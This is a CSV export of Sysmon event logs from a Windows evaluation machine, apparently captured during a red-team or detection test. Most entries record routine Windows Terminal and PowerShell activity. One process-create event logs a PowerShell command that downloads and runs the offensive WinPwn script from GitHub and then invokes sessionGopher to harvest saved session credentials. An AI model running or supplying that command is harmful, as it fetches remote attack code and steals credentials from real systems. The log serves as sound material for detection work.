Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:18:58.946,,,,,,,,,11,9518,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:18:58.946

ProcessGuid: {fda94052-3d81-658d-9002-000000000b00}

ProcessId: 6796

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_chsw3je1.5ej.ps1

CreationUtcTime: 2023-12-28 09:18:58.946

User: WINDEV2309EVAL\User",Info,,,,,,,,{fda94052-3d81-658d-9002-000000000b00},7044,6796,,,,,,"
      ",-,,,,,,2023-12-28T09:18:58.9635735Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_chsw3je1.5ej.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:58.946,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:58.9635735Z""/>
      <EventRecordID>9518</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:58.946</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9002-000000000b00}</Data>
      <Data Name=""ProcessId"">6796</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_chsw3je1.5ej.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:18:58.946</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:18:58.946

ProcessGuid: {fda94052-3d81-658d-9002-000000000b00}

ProcessId: 6796

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_chsw3je1.5ej.ps1

CreationUtcTime: 2023-12-28 09:18:58.946

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9517,,-,"MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:58.503

ProcessGuid: {fda94052-3d82-658d-9f02-000000000b00}

ProcessId: 6660

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,,{fda94052-3d82-658d-9f02-000000000b00},7044,6660,-,,,,,"
      ",-,,,,,,2023-12-28T09:18:58.5459644Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:58.503,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:58.5459644Z""/>
      <EventRecordID>9517</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:58.503</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d82-658d-9f02-000000000b00}</Data>
      <Data Name=""ProcessId"">6660</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:58.503

ProcessGuid: {fda94052-3d82-658d-9f02-000000000b00}

ProcessId: 6660

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:18:58.068,,,,,,,,,11,9516,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:18:58.068

ProcessGuid: {fda94052-3d81-658d-8c02-000000000b00}

ProcessId: 10160

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_31zd0bjp.h2x.ps1

CreationUtcTime: 2023-12-28 09:18:58.068

User: WINDEV2309EVAL\User",Info,,,,,,,,{fda94052-3d81-658d-8c02-000000000b00},7044,10160,,,,,,"
      ",-,,,,,,2023-12-28T09:18:58.0794623Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_31zd0bjp.h2x.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:58.068,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:58.0794623Z""/>
      <EventRecordID>9516</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:58.068</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-8c02-000000000b00}</Data>
      <Data Name=""ProcessId"">10160</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_31zd0bjp.h2x.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:18:58.068</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:18:58.068

ProcessGuid: {fda94052-3d81-658d-8c02-000000000b00}

ProcessId: 10160

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_31zd0bjp.h2x.ps1

CreationUtcTime: 2023-12-28 09:18:58.068

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9515,,-,"MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.751

ProcessGuid: {fda94052-3d81-658d-9e02-000000000b00}

ProcessId: 5816

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,,{fda94052-3d81-658d-9e02-000000000b00},7044,5816,-,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.7539534Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.751,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.7539534Z""/>
      <EventRecordID>9515</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.751</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9e02-000000000b00}</Data>
      <Data Name=""ProcessId"">5816</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.751

ProcessGuid: {fda94052-3d81-658d-9e02-000000000b00}

ProcessId: 5816

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:18:57.624,,,,,,,,,11,9514,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:18:57.624

ProcessGuid: {fda94052-3d81-658d-9c02-000000000b00}

ProcessId: 2340

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_j0oei5px.4v1.ps1

CreationUtcTime: 2023-12-28 09:18:57.624

User: WINDEV2309EVAL\User",Info,,,,,,,,{fda94052-3d81-658d-9c02-000000000b00},7044,2340,,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.6335561Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_j0oei5px.4v1.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.624,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.6335561Z""/>
      <EventRecordID>9514</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.624</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9c02-000000000b00}</Data>
      <Data Name=""ProcessId"">2340</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_j0oei5px.4v1.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:18:57.624</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:18:57.624

ProcessGuid: {fda94052-3d81-658d-9c02-000000000b00}

ProcessId: 2340

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_j0oei5px.4v1.ps1

CreationUtcTime: 2023-12-28 09:18:57.624

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sessionGopher -noninteractive -consoleoutput}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9513,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.470

ProcessGuid: {fda94052-3d81-658d-9c02-000000000b00}

ProcessId: 2340

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sessionGopher -noninteractive -consoleoutput}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,,{fda94052-3d81-658d-9c02-000000000b00},7044,2340,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:18:57.4711609Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:18:57.470,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:18:57.4711609Z""/>
      <EventRecordID>9513</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:18:57.470</Data>
      <Data Name=""ProcessGuid"">{fda94052-3d81-658d-9c02-000000000b00}</Data>
      <Data Name=""ProcessId"">2340</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sessionGopher -noninteractive -consoleoutput}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.470

ProcessGuid: {fda94052-3d81-658d-9c02-000000000b00}

ProcessId: 2340

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sessionGopher -noninteractive -consoleoutput}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9512,,-,"MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:18:57.329

ProcessGuid: {fda94052-3d81-658d-9b02-000000000b00}

ProcessId: 2524

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

